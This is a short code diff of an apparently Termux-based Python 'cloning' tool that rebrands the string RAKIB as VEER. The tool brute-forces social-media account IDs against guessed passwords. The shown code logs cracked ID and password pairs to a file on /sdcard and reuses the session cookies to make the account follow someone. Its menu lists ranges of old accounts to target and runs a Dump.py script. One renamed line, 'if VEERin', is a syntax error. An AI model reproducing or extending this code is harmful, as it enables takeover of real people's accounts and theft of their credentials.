@@ -372,7 +372,7 @@ def free(idf,pwv):
 				print(f'\r\x1b[1;92m [ RAKIB-OK ] {idf} | {pw}')
 				wrt =('%s - %s' % (idf,pw))
 				ok.append(wrt)
-				open('/sdcard/RAKIB-OK.txt','a').write('%s\n' % wrt)
+				open('/sdcard/VEER-OK.txt','a').write('%s\n' % wrt)
 				follow(ses,coki)
 				break
 
@@ -425,16 +425,16 @@ class Main:
 		print(" [4] 2004-10 Cloning")
 		print(" [5] 2011-22 Cloning")
 		print(" [E] Exit Programming\n")
-		RAKIB=input(" Choose : ")
-		if RAKIB in ["1", "01"]:
+		VEER=input(" Choose : ")
+		if VEER in ["1", "01"]:
 			File()
-		if RAKIB in ["2", "02"]:
+		if VEER in ["2", "02"]:
 			Public()
-		if RAKIBin ["3", "03"]:
+		if VEERin ["3", "03"]:
 			os.system("python Dump.py")
-		if RAKIB in ["4", "04"]:
+		if VEER in ["4", "04"]:
 			self.old()
-		if RAKIB in ["5", "05"]:
+		if VEER in ["5", "05"]:
 			self.old2()
 			exit()
 		else:
